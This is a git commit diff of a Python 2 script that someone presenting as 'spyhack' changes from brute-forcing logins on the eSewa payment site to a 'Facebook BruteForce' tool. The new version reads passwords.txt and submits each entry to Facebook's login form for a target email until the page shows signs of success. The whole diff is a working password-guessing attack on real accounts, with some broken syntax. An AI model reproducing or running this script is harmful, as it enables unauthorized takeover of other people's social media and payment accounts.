e98414bab8b7a786ec5d9aa4e6f4ecc4abb3bc81
spyhack <112711360+vicky3690@users.noreply.github.com>
2023-07-04 04:46:26 +0545

    Update fp2.py

--- fp2.py
+++ fp2.py
@@ -1,59 +1,55 @@
 import time
 import sys
 
-if sys.version_info[0] != 2:
-    print('''--------------------------------------
-    REQUIRED PYTHON 2.x
-    use: python fb2.py
+if sys.version_info[0] !=2: 
+	print('''--------------------------------------
+	REQUIRED PYTHON 2.x
+	use: python fb2.py
 --------------------------------------
-        ''')
-    sys.exit()
+			''')
+	sys.exit()
 
-post_url = 'https://www.esewa.com.np/login.php'
+post_url='https://www.facebook.com/login.php'
 headers = {
-    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36',
+	'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36',
 }
 
 try:
-    import mechanize
-    browser = mechanize.Browser()
-    browser.addheaders = [('User-Agent', headers['User-Agent'])]
-    browser.set_handle_robots(False)
-except ImportError:
-    print('\nPlease install mechanize.\n')
-    sys.exit()
+	import mechanize
+	import urllib2
+	browser = mechanize.Browser()
+	browser.addheaders = [('User-Agent',headers['User-Agent'])]
+	browser.set_handle_robots(False)
+except:
+	print('\n\tPlease install mechanize.\n')
+	sys.exit()
 
-print('\n---------- Welcome Vicky ----------\n')
-file = open('passwords.txt', 'r')
+print('\n---------- Welcome To VICKY's Facebook BruteForce ----------n')
+file=open('passwords.txt','r')
 
-MobileNumber = str(raw_input('Mobile Number : ').strip())
+email=str(raw_input('Enter Email/Username : ').strip())
 
-print("\nTarget Mobile Number : ", MobileNumber)
-print("\nTrying Passwords from list ...")
+print ("\nTarget Email ID : ",email)
+print "\nTrying Passwords from list ..."
 
-i = 0
-while True:
-    passw = file.readline().strip()
-    i += 1
-    if len(passw) < 4:
-        continue
-    print(str(i) + " : " + passw)
-    response = browser.open(post_url)
-    try:
-        if response.code == 200:
-            browser.select_form(nr=0)
-            browser.form['Mobile Number'] = MobileNumber
-            browser.form['MPIN'] = passw
-            response = browser.submit()
-            response_data = response.read()
-            print(response_data.decode('utf-8'))
-            print('Your password is : ', passw)
-
-    except Exception as e:
-        print('\nSleeping for time : 0 min\n')
-        time.sleep(0)
-
-    if not passw:
-        break
-
-file.close()
+i=0
+while file:
+	passw=file.readline().strip()
+	i+=1
+	if len(passw) < 8:
+		continue
+	print str(i) +" : ",passw
+	response = browser.open(post_url)
+	try:
+		if response.code == 200:
+			browser.select_form(nr=0)
+			browser.form['email'] = email
+			browser.form['pass'] = passw
+			response = browser.submit()
+			response_data = response.read()
+			if 'Find Friends' in response_data or 'Two-factor authentication' in response_data or 'security code' in response_data:
+				print('Your password is : ',passw)
+				break
+	except:
+		print('\nSleeping for time : 0 min\n')
+		time.sleep(00)
